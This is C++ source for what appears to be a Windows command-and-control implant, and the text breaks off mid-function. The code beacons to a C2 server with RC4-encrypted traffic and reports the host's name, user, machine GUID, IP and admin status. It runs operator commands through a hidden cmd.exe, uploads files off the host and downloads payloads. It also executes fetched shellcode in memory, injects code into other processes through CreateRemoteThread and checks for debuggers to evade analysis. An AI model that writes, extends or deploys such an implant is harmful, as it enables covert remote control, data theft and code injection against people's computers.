#define no_init_all
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <vector>
#include <wininet.h>
#include "json.hpp"
#include <direct.h>
#include <sstream>
#include <iomanip>
#include <stdlib.h>
#include <TlHelp32.h>
#include "Loader.h"
#include <iphlpapi.h>
#include <winternl.h>
#include "config.h"


using json = nlohmann::json;
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#ifdef _DEBUG
#define VERBOSE 1 // Allows debug output
#else
#define VERBOSE 0
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if VERBOSE
#define PRINTF(f_, ...) printf((f_), __VA_ARGS__)
#define CERR(x) std::cerr << x
#define COUT(x) std::cout << x
#else
#define PRINTF(X)
#define CERR(x)
#define COUT(x)
#endif


// Configuration Constants
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 9090
#define API_ENDPOINT "/api/send"
#define SLEEP_TIME 10      // seconds between polling
#define USERAGENT "Mozilla/5.0"
#define C2SSL FALSE
#define MAX_RETRIES 3
#define RETRY_SLEEP 3000   // 3 seconds

// Global Agent ID
std::string agent_id;
int globalSleepTime = SLEEP_TIME;      // default sleep time
int globalJitterMax = 30;              // default maximum jitter percentage
int globalJitterMin = 25;              // default minimum jitter percentage

// ------------------ Base64 Functions ------------------
std::string base64_encode(const std::string &in) {
	static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	std::string out;
	int val = 0, valb = -6;
	for (unsigned char c : in) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			out.push_back(base64_chars[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6)
		out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
	while (out.size() % 4)
		out.push_back('=');
	return out;
}

std::string base64_decode(const std::string &in) {
	std::string input = in;
	// Convert URL-safe characters to standard Base64 ones.
	for (auto &c : input) {
		if (c == '-') c = '+';
		else if (c == '_') c = '/';
	}
	std::string filtered;
	for (char c : input) {
		if (isalnum(c) || c == '+' || c == '/' || c == '=')
			filtered.push_back(c);
	}
	std::string out;
	std::vector<int> T(256, -1);
	std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	for (int i = 0; i < 64; i++)
		T[base64_chars[i]] = i;
	int val = 0, valb = -8;
	for (unsigned char c : filtered) {
		if (c == '=') break;
		if (T[c] == -1) continue;
		val = (val << 6) + T[c];
		valb += 6;
		if (valb >= 0) {
			out.push_back(char((val >> valb) & 0xFF));
			valb -= 8;
		}
	}
	return out;
}

// ------------------ HTTP POST Functions ------------------
bool http_post(const std::string &jsonBody, std::string &response) {
	HINTERNET hSession = InternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hSession) return false;

	HINTERNET hConnect = InternetConnectA(hSession, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		InternetCloseHandle(hSession);
		return false;
	}

	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_KEEP_CONNECTION;
	if (C2SSL) flags |= INTERNET_FLAG_SECURE;

	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", API_ENDPOINT, NULL, NULL, NULL, flags, 0);
	if (!hRequest) {
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return false;
	}

	const char* headers = "Content-Type: application/json; utf-8";
	BOOL sendResult = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), (LPVOID)jsonBody.c_str(), (DWORD)jsonBody.size());
	if (!sendResult) {
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return false;
	}

	// Only read the response if we have a valid response string reference
	char buffer[1024];
	DWORD bytesRead = 0;
	std::string resp;

	while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		resp.append(buffer);
	}

	response = resp;

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);
	return true;
}

bool sendHttpPost(const std::string &jsonBody, std::string &response) {
	int attempts = 0;
	bool success = false;
	while (attempts < MAX_RETRIES && !success) {
		if (http_post(jsonBody, response))
			success = true;
		else {
			attempts++;
			if (attempts < MAX_RETRIES) {
				CERR("HTTP POST failed. Retrying in " << RETRY_SLEEP << " ms...\n");
				Sleep(RETRY_SLEEP);
			}
		}
	}
	return success;
}

// Simple RC4
static void rc4_init(unsigned char *s, const unsigned char *key, int keylen) {
	for (int i = 0; i < 256; ++i) s[i] = i;
	int j = 0;
	for (int i = 0; i < 256; ++i) {
		j = (j + s[i] + key[i % keylen]) & 0xFF;
		std::swap(s[i], s[j]);
	}
}

static void rc4_crypt(unsigned char *s, unsigned char *data, int len) {
	int i = 0, j = 0;
	for (int k = 0; k < len; ++k) {
		i = (i + 1) & 0xFF;
		j = (j + s[i]) & 0xFF;
		std::swap(s[i], s[j]);
		data[k] ^= s[(s[i] + s[j]) & 0xFF];
	}
}

std::string Rc4Encrypt(const std::string &in, const std::string &key) {
	std::vector<unsigned char> S(256);
	rc4_init(S.data(), (const unsigned char*)key.data(), key.size());
	std::string out = in;
	rc4_crypt(S.data(), (unsigned char*)out.data(), out.size());
	return out;
}
// RC4 is symmetric:
#define Rc4Decrypt Rc4Encrypt

// Wrap, send, receive, and unwrap in one go.
// Returns false on transport error or JSON parse error.
bool sendEncryptedRequest(
	const json &innerPayload,
	json &outUnwrappedResponse
) {
	try {
		// 1) serialize & encrypt
		std::string clear = innerPayload.dump();
		std::string cipher = Rc4Encrypt(clear, RC4_KEY);
		std::string b64 = base64_encode(cipher);
		json transport = { {"d", b64} };
		std::string reqBody = transport.dump();

		// 2) send over HTTP
		std::string rawResp;
		if (!sendHttpPost(reqBody, rawResp)) {
			PRINTF("[ERROR] HTTP POST failed\n");
			return false;
		}

		PRINTF("[DEBUG] Raw server response: %s\n", rawResp.c_str());

		// 3) parse transport envelope
		json outer;
		try {
			outer = json::parse(rawResp);
		}
		catch (const json::exception& e) {
			PRINTF("[ERROR] Failed to parse server response as JSON: %s\n", e.what());
			return false;
		}

		// Check if 'd' field exists
		if (!outer.contains("d")) {
			PRINTF("[ERROR] Server response doesn't contain 'd' field\n");
			return false;
		}

		// 4) base64-decode + RC4-decrypt
		std::string respB64 = outer["d"].get<std::string>();
		std::string respCipher;
		try {
			respCipher = base64_decode(respB64);
		}
		catch (const std::exception& e) {
			PRINTF("[ERROR] Failed to base64 decode response: %s\n", e.what());
			return false;
		}

		std::string respClear = Rc4Decrypt(respCipher, RC4_KEY);
		PRINTF("[DEBUG] Decrypted response: %s\n", respClear.c_str());

		// 5) parse intermediate JSON
		json intermediate;
		try {
			intermediate = json::parse(respClear);
		}
		catch (const json::exception& e) {
			PRINTF("[ERROR] Failed to parse decrypted response as JSON: %s\n", e.what());
			return false;
		}

		// Check if the decrypted JSON has a 'data' field
		if (intermediate.contains("data")) {
			// This is the additional layer - we need to base64 decode the 'data' field
			std::string dataB64 = intermediate["data"].get<std::string>();
			std::string dataStr;
			try {
				dataStr = base64_decode(dataB64);
			}
			catch (const std::exception& e) {
				PRINTF("[ERROR] Failed to base64 decode data field: %s\n", e.what());
				return false;
			}

			// Finally parse the actual response
			try {
				outUnwrappedResponse = json::parse(dataStr);
				PRINTF("[DEBUG] Final parsed response: %s\n", outUnwrappedResponse.dump().c_str());
			}
			catch (const json::exception& e) {
				PRINTF("[ERROR] Failed to parse data content as JSON: %s\n", e.what());
				return false;
			}
		}
		else {
			// No additional layer, just use the decrypted JSON directly
			outUnwrappedResponse = intermediate;
		}

		return true;
	}
	catch (const std::exception& e) {
		PRINTF("[ERROR] Unhandled exception in sendEncryptedRequest: %s\n", e.what());
		return false;
	}
}

// A variant that only needs to send, ignores the reply
bool postEncryptedFireAndForget(const json &innerPayload) {
	std::string clear = innerPayload.dump();
	std::string cipher = Rc4Encrypt(clear, RC4_KEY);
	std::string b64 = base64_encode(cipher);
	json transport = { {"d", b64} };

	// Create a dummy response string instead of dereferencing nullptr
	std::string dummyResponse;
	return sendHttpPost(transport.dump(), dummyResponse);
}


bool UploadFile(const std::string &taskId, const std::string &filePath, std::string &outputMessage) {
	// Open the file
	FILE* fp = fopen(filePath.c_str(), "rb");
	if (!fp) {
		outputMessage = "Failed to open file: " + filePath;
		return false;
	}

	// Get file details
	fseek(fp, 0, SEEK_END);
	long fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	// Extract filename from path
	size_t pos = filePath.find_last_of("\\/");
	std::string fileName = (pos != std::string::npos) ? filePath.substr(pos + 1) : filePath;

	// Create UploadStart request (HT = 4)
	json startData = {
		{"agent_id", agent_id},
		{"task_id", taskId},
		{"file_name", fileName},
		{"file_size", fileSize},
		{"path", filePath},
		{"content", ""},
	};

	// Base64 encode the startData
	std::string encoded_data = base64_encode(startData.dump());

	// Create outer request structure
	json outerStartData = {
		{"data", encoded_data},
		{"ht", 4}  // UploadStart
	};

	json startResponse;
	if (!sendEncryptedRequest(outerStartData, startResponse)) {
		outputMessage = "UploadStart failed (HTTP error).";
		fclose(fp);
		return false;
	}

	PRINTF("[DEBUG] UploadStart response: %s\n", startResponse.dump().c_str());

	// Extract file_id from response
	std::string file_id;
	if (startResponse.contains("id")) {
		file_id = startResponse["id"].get<std::string>();
	}
	else {
		outputMessage = "No file ID returned from UploadStart.";
		fclose(fp);
		return false;
	}

	// UploadChunk (HT = 5)
	const size_t CHUNK_SIZE = 4096;
	int chunk_id = 0;
	bool success = true;

	while (!feof(fp) && success) {
		char buffer[CHUNK_SIZE];
		size_t bytesRead = fread(buffer, 1, CHUNK_SIZE, fp);
		if (bytesRead > 0) {
			std::string chunkDataStr(buffer, bytesRead);
			std::string encodedChunk = base64_encode(chunkDataStr);

			// Create chunk data
			json chunkData = {
				{"task_id", taskId},
				{"chunk_id", chunk_id},
				{"content", encodedChunk},
				{"file_id", file_id}
			};

			// Base64 encode the chunkData
			std::string encoded_chunk_data = base64_encode(chunkData.dump());

			// Create outer request structure
			json outerChunkData = {
				{"data", encoded_chunk_data},
				{"ht", 5}  // UploadChunk
			};

			json chunkResponse;
			if (!sendEncryptedRequest(outerChunkData, chunkResponse)) {
				outputMessage = "UploadChunk failed at chunk " + std::to_string(chunk_id);
				success = false;
				break;
			}
			chunk_id++;
		}
	}

	fclose(fp);
	if (!success) return false;

	// UploadEnd (HT = 6)
	json endData = {
		{"agent_id", agent_id},
		{"task_id", taskId},
		{"status", 4},
		{"result", ""},
		{"file_id", file_id}
	};

	// Base64 encode the endData
	std::string encoded_end_data = base64_encode(endData.dump());

	// Create outer request structure
	json outerEndData = {
		{"data", encoded_end_data},
		{"ht", 6}  // UploadEnd
	};

	json endResponse;
	if (!sendEncryptedRequest(outerEndData, endResponse)) {
		outputMessage = "UploadEnd failed (HTTP error).";
		return false;
	}

	outputMessage = "File uploaded successfully: " + fileName;
	return true;
}


std::wstring StringToWString(const std::string &s) {
	int len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, NULL, 0);
	std::wstring ws(len, L'\0');
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, &ws[0], len);
	if (!ws.empty() && ws.back() == L'\0')
		ws.pop_back();
	return ws;
}

// ------------------ System Information Functions ------------------
std::string get_username() {
	char username[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD nameSize = 255;
	GetUserNameA(username, &nameSize);
	return std::string(username);
}

std::string get_hostname() {
	char hostname[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD nameSize = 255;
	GetComputerNameA(hostname, &nameSize);
	return std::string(hostname);
}

std::string get_machine_guid() {
	HKEY hKey;
	char guid[256] = { 0 };
	DWORD bufLen = sizeof(guid);
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
		if (RegQueryValueExA(hKey, "MachineGuid", nullptr, nullptr, reinterpret_cast<LPBYTE>(guid), &bufLen) == ERROR_SUCCESS) {
			RegCloseKey(hKey);
			return std::string(guid);
		}
		RegCloseKey(hKey);
	}
	return "unknown-guid";
}

std::string get_os_version() {
	OSVERSIONINFOA info;
	ZeroMemory(&info, sizeof(info));
	info.dwOSVersionInfoSize = sizeof(info);
#pragma warning(push)
#pragma warning(disable:4996)
	GetVersionExA(&info);
#pragma warning(pop)
	return std::to_string(info.dwMajorVersion) + "." + std::to_string(info.dwMinorVersion) + " (" + std::to_string(info.dwBuildNumber) + ")";
}

int get_integrity() {
	BOOL isAdmin = FALSE;
	PSID adminGroup = NULL;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
		if (!CheckTokenMembership(NULL, adminGroup, &isAdmin))
			isAdmin = FALSE;
		FreeSid(adminGroup);
	}
	return isAdmin ? 4 : 3;
}

// ------------------ Injection Function ------------------
int Inject_CreateRemoteThread(HANDLE hProc, PVOID payload, SIZE_T payload_len)
{
	LPVOID pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pRemoteCode)
	{
		PRINTF("VirtualAllocEx failed: %d\n", GetLastError());
		return -1;
	}
	if (!WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL))
	{
		PRINTF("WriteProcessMemory failed: %d\n", GetLastError());
		VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
		return -1;
	}
	DWORD dummy;
	if (!VirtualProtectEx(hProc, pRemoteCode, payload_len, PAGE_EXECUTE_READ, &dummy))
	{
		PRINTF("VirtualProtectEx failed: %d\n", GetLastError());
		VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
		return -1;
	}
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
	if (hThread == NULL)
	{
		PRINTF("CreateRemoteThread failed: %d\n", GetLastError());
		VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
		return -1;
	}
	WaitForSingleObject(hThread, 2000);
	CloseHandle(hThread);
	VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
	return 0;
}

std::string GetInternalIP() {
	ULONG outBufLen = 15000;
	PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
	if (!pAddresses) return "unknown";

	DWORD dwRetVal = GetAdaptersAddresses(AF_INET, 0, NULL, pAddresses, &outBufLen);
	if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
		free(pAddresses);
		pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
		dwRetVal = GetAdaptersAddresses(AF_INET, 0, NULL, pAddresses, &outBufLen);
	}

	std::string internalIP = "unknown";
	if (dwRetVal == NO_ERROR) {
		for (PIP_ADAPTER_ADDRESSES curr = pAddresses; curr; curr = curr->Next) {
			for (PIP_ADAPTER_UNICAST_ADDRESS ua = curr->FirstUnicastAddress; ua; ua = ua->Next) {
				SOCKADDR_IN* sa = reinterpret_cast<SOCKADDR_IN*>(ua->Address.lpSockaddr);
				char buf[INET_ADDRSTRLEN] = { 0 };
				inet_ntop(AF_INET, &sa->sin_addr, buf, sizeof(buf));
				internalIP = buf;
				break;   // assume only one interface
			}
			if (internalIP != "unknown") break;
		}
	}
	free(pAddresses);
	return internalIP;
}

// ------------------ Registration (ht==1) ------------------
bool RegisterWithServer() {
	json registerData = {
		{"machine_guid", get_machine_guid()},
		{"hostname", get_hostname()},
		{"username", get_username()},
		{"internal_ip", GetInternalIP()},
		{"external_ip", ""},
		{"os", get_os_version()},
		{"process_arch", 1},
		{"integrity", get_integrity()}
	};

	std::string encoded_data = base64_encode(registerData.dump());

	json request_data = {
		{"data", encoded_data},
		{"ht", 1}  // requesttype.Registration.value
	};

	json responseObj;
	if (sendEncryptedRequest(request_data, responseObj)) {
		if (responseObj.contains("agent_id")) {
			agent_id = responseObj["agent_id"].get<std::string>();
			PRINTF("[+] Registered successfully. Agent ID: %s\n", agent_id.c_str());
			return true;
		}
	}
	return false;
}


bool ExecuteSetPrivShellcode(char* shellcode, size_t shellcodeSize) {
	// Allocate executable memory in the current process
	void* execMemory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (execMemory == NULL) {
		return false;
	}
	// Copy the shellcode into the allocated memory
	memcpy(execMemory, shellcode, shellcodeSize);
	// Change the memory protection to allow execution
	DWORD oldProtect;
	if (!VirtualProtect(execMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
		VirtualFree(execMemory, 0, MEM_RELEASE);
		return false;
	}
	// Create a thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);
	if (hThread == NULL) {
		VirtualFree(execMemory, 0, MEM_RELEASE);
		return false;
	}
	// Wait for the shellcode to finish executing
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	VirtualFree(execMemory, 0, MEM_RELEASE);
	return true;
}

std::string ExecuteShellCommand(const std::string &command) {
	BOOL ok = TRUE;
	HANDLE hStdInPipeRead = NULL;
	HANDLE hStdInPipeWrite = NULL;
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

	// Create the pipes for STDIN and STDOUT.
	if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0))
	{
		PRINTF("[DEBUG] Error: Failed to create STDIN pipe. Error: %d\n", GetLastError());
		return "Error: Failed to create STDIN pipe.";
	}
	if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0)) {
		PRINTF("[DEBUG] Error: Failed to create STDOUT pipe. Error: %d\n", GetLastError());
		return "Error: Failed to create STDOUT pipe.";
	}

	// Set up STARTUPINFO to redirect handles and hide the window.
	STARTUPINFOW si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	si.hStdInput = hStdInPipeRead;

	PROCESS_INFORMATION pi = { 0 };
	std::wstring wCommandLine = L"cmd.exe /c " + StringToWString(command);
	PRINTF("[DEBUG] Executing command: %s\n", command.c_str());
	PRINTF("[DEBUG] Full command line: %ls\n", wCommandLine.c_str());

	if (!CreateProcessW(NULL,(LPWSTR)wCommandLine.c_str(),NULL,NULL,TRUE,0,NULL,NULL,&si,&pi))                                     
	{
		PRINTF("[DEBUG] Error: Failed to create process. Error: %d\n", GetLastError());
		return "Error: Failed to create process.";
	}

	// Wait for the process to finish
	if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hStdOutPipeWrite);
		CloseHandle(hStdInPipeRead);
		return "Error: Process timed out.";
	}

	// Close unneeded pipe handles.
	CloseHandle(hStdOutPipeWrite);
	CloseHandle(hStdInPipeRead);

	// Read the output from the STDOUT pipe.
	std::string output;
	const DWORD BUFSIZE = 1024;
	char buffer[BUFSIZE + 1] = { 0 };
	DWORD dwRead = 0;
	ok = ReadFile(hStdOutPipeRead, buffer, BUFSIZE, &dwRead, NULL);
	while (ok && dwRead > 0) {
		buffer[dwRead] = '\0';
		output.append(buffer);
		ok = ReadFile(hStdOutPipeRead, buffer, BUFSIZE, &dwRead, NULL);
	}

	// Clean up all handles.
	CloseHandle(hStdOutPipeRead);
	CloseHandle(hStdInPipeWrite);
	DWORD dwExitCode = 0;
	GetExitCodeProcess(pi.hProcess, &dwExitCode);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	SecureZeroMemory(buffer, sizeof(buffer));

	return output;
}

std::string DownloadFilePayload(const json &task) {
	// Get the file identifier and task ID from the task object.
	std::string file_id = task["file_id"].get<std::string>();
	std::string task_id = task["id"].get<std::string>();

	// Build the DownloadStart request (ht == 7)
	json requestData = {
		{"agent_id", agent_id},
		{"task_id", task_id},
		{"file_id", file_id},
		{"ht", 7}  // DownloadStart
	};

	json downloadResponse;
	if (!sendEncryptedRequest(requestData, downloadResponse))
		return "";

	std::string payload = "";
	if (downloadResponse.contains("chunk")) {
		// The server sends the chunk data base64-encoded.
		std::string chunk_encoded = downloadResponse["chunk"].get<std::string>();
		payload += base64_decode(chunk_encoded);
	}
	int next_chunk_id = 0;
	if (downloadResponse.contains("next_chunk_id"))
		next_chunk_id = downloadResponse["next_chunk_id"].get<int>();

	// Retrieve any additional chunks via DownloadChunk (ht == 8)
	while (next_chunk_id != 0) {
		json chunkRequestData = {
			{"file_id", file_id},
			{"chunk_id", next_chunk_id},
			{"ht", 8}
		};

		json chunkDownloadResponse;
		if (!sendEncryptedRequest(chunkRequestData, chunkDownloadResponse))
			break;

		if (chunkDownloadResponse.contains("chunk")) {
			std::string chunk_encoded = chunkDownloadResponse["chunk"].get<std::string>();
			payload += base64_decode(chunk_encoded);
		}
		if (chunkDownloadResponse.contains("next_chunk_id"))
			next_chunk_id = chunkDownloadResponse["next_chunk_id"].get<int>();
		else
			next_chunk_id = 0;
	}
	return payload;
}

// Collection of anti-debugging techniques
bool IsDebuggerPresent_PEB() {
	return ::IsDebuggerPresent() != FALSE;
}


bool IsDebuggerPresent_API() {
	// Simple Windows API check
	return ::IsDebuggerPresent();
}

bool CheckDebugPort() {
	// Check debug port via NtQueryInformationProcess
	typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		ULONG ProcessInformationLength,
		PULONG ReturnLength
		);

	const int ProcessDebugPort = 7;
	DWORD debugPort = 0;
	NTSTATUS status;

	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(
		GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

	if (!NtQueryInformationProcess)
		return false;

	status = NtQueryInformationProcess(
		GetCurrentProcess(),
		ProcessDebugPort,
		&debugPort,
		sizeof(debugPort),
		NULL);

	return NT_SUCCESS(status) && debugPort != 0;
}

bool CheckDebuggerTimestamp() {
	// Time-based detection
	LARGE_INTEGER start, end, freq;
	QueryPerformanceCounter(&start);

	// Execute an instruction that is captured by debuggers
	__try {
		OutputDebugStringA("Anti-Debug Check");
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		// Exception occurred
	}

	QueryPerformanceCounter(&end);
	QueryPerformanceFrequency(&freq);

	// Calculate time in microseconds
	double time = ((double)(end.QuadPart - start.QuadPart) * 1000000.0) / (double)freq.QuadPart;

	// If time exceeds threshold, likely debugged
	return time > 100.0; // 100 microseconds threshold
}

// Main anti-debugging check function that combines multiple techniques
bool IsBeingDebugged() {
	int detections = 0;

	if (IsDebuggerPresent_API())
		detections++;

	if (IsDebuggerPresent_PEB())
		detections++;

	if (CheckDebugPort())
		detections++;

	if (CheckDebuggerTimestamp()) // Keep your existing implementation
		detections++;

	// Return true if at least two techniques detected a debugger
	return detections >= 2;
}

// Add this to your RegisterWithServer function to report debug status
void ReportDebugStatus() {
	bool debugDetected = IsBeingDebugged();

	json debugData = {
		{"agent_id", agent_id},
		{"debug_detected", debugDetected},
		{"timestamp", time(NULL)}
	};

	std::string encoded_data = base64_encode(debugData.dump());

	json debugRequest = {
		{"data", encoded_data},
		{"ht", 10}  // Use a new request type for debug reports
	};

	// Fire and forget - we don't need a response
	postEncryptedFireAndForget(debugRequest);
}



// ------------------ Task Execution Functions (Client) ------------------
struct TaskResult {
	int status;      // 4 = Success, 5 = Failure, 6 = NotImplemented, 7 = Injection Failed
	std::string output;
};

TaskResult ExecuteTask(const json &task) {
	TaskResult result;
	int taskType = task["type"].get<int>();
	std::string input = "";
	if (task.contains("input"))
		input = task["input"].get<std::string>();

	switch (taskType) {
	case 1: // Terminate
		result.status = 4;
		result.output = "Terminating";
		ExitProcess(0);
		break;
	case 2: // Shell
	{
		std::string cmdOutput = ExecuteShellCommand(input);
		if (cmdOutput.find("Error:") != std::string::npos) {
			result.status = 5; // Fails
			result.output = cmdOutput;
		}
		else {
			result.status = 4; // Success
			result.output = cmdOutput;
		}
		break;
	}
	case 3: { // pwd
		char buffer[MAX_PATH];
		if (_getcwd(buffer, MAX_PATH)) {
			result.output = std::string(buffer);
			result.status = 4;
			PRINTF("[DEBUG] pwd result: %s\n", result.output.c_str());
		}
		else {
			result.output = "Failed to get current directory";
			result.status = 5;
			CERR("[DEBUG] _getcwd failed\n");
		}
		break;
	}
	case 4: { // cd
		if (SetCurrentDirectoryA(input.c_str())) {
			result.output = "Changed directory to " + input;
			result.status = 4;
		}
		else {
			result.output = "Failed to change directory to " + input;
			result.status = 5;
		}
		break;
	}
	case 5: { // whoami
		result.output = get_username();
		result.status = 4;
		break;
	}
	case 6: { // ps
		std::stringstream ss;
		ss << std::setw(8) << "PID" << " " << std::setw(8) << "Parent" << " "
			<< std::setw(6) << "Arch" << " " << std::setw(18) << "User" << " " << "Process Name" << "\n";
		ss << "-------------------------------------------------------------\n";

		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE) {
			result.output = "Failed to create process snapshot";
			result.status = 5;
			break;
		}
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(hSnapshot, &pe32)) {
			CloseHandle(hSnapshot);
			result.output = "Failed to retrieve first process";
			result.status = 5;
			break;
		}
		do {
			DWORD pid = pe32.th32ProcessID;
			DWORD ppid = pe32.th32ParentProcessID;
			std::string procName = pe32.szExeFile;
			std::string arch = "N/A";
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
			if (hProcess != NULL) {
				BOOL isWow64 = FALSE;
				typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
				LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
				if (fnIsWow64Process) {
					if (fnIsWow64Process(hProcess, &isWow64))
						arch = isWow64 ? "x86" : "x64";
				}
				CloseHandle(hProcess);
			}
			std::string user = "";
			ss << std::setw(8) << pid << " " << std::setw(8) << ppid << " " << std::setw(6) << arch << " "
				<< std::setw(18) << user << " " << procName << "\n";
		} while (Process32Next(hSnapshot, &pe32));
		CloseHandle(hSnapshot);
		result.output = ss.str();
		result.status = 4;
		break;
	}
	case 7: {
		if (!task.contains("file_id")) {
			result.output = "Download task missing file_id.";
			result.status = 5;
			break;
		}
		std::string dest_path = input;
		std::string file_data = DownloadFilePayload(task);
		if (file_data.empty()) {
			result.output = "Failed to download file data.";
			result.status = 5;
		}
		else {
			FILE *fp = fopen(dest_path.c_str(), "wb");
			if (fp == nullptr) {
				result.output = "Failed to open file for writing: " + dest_path;
				result.status = 5;
			}
			else {
				fwrite(file_data.data(), 1, file_data.size(), fp);
				fclose(fp);
				result.output = "File downloaded successfully to " + dest_path;
				result.status = 4;
			}
		}
		break;
	}
	case 8: {
		// "input" is the local file path on the client
		std::string file_path = input;

		std::string outputMessage;
		bool success = UploadFile(task["id"].get<std::string>(), file_path, outputMessage);

		result.status = success ? 4 : 5;  // 4 = Success, 5 = Failure
		result.output = outputMessage;
		break;
	}

	case 9: { // ListPrivs task
		std::string shellcode = DownloadFilePayload(task);
		if (shellcode.empty()) {
			result.status = 5;
			result.output = "Failed to download listprivs shellcode.";
			break;
		}
		// Capture stdout from shellcode execution
		std::string output;
		HANDLE readPipe, writePipe;
		SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
		if (!CreatePipe(&readPipe, &writePipe, &saAttr, 0)) {
			result.status = 5;
			result.output = "Failed to create pipe for listprivs.";
			break;
		}
		if (!SetStdHandle(STD_OUTPUT_HANDLE, writePipe)) {
			result.status = 5;
			result.output = "Failed to redirect stdout.";
			break;
		}

		bool execSuccess = ExecuteSetPrivShellcode((char*)shellcode.data(), shellcode.size());

		DWORD bytesRead;
		char buffer[4096];
		std::string shellOutput;
		while (ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
			shellOutput.append(buffer, bytesRead);
		}

		CloseHandle(readPipe);
		CloseHandle(writePipe);

		if (execSuccess) {
			result.status = 4;
			result.output = shellOutput;
		}
		else {
			result.status = 5;
			result.output = "Listpriv shellcode execution failed.";
		}
		break;
	}

	case 11: { // Remote Injection (scinject)
		if (!task.contains("file_id")) {
			result.output = "No shellcode provided.";
			result.status = 5;
			break;
		}
		int targetPid = 0;
		try {
			targetPid = std::stoi(input);
		}
		catch (...) {
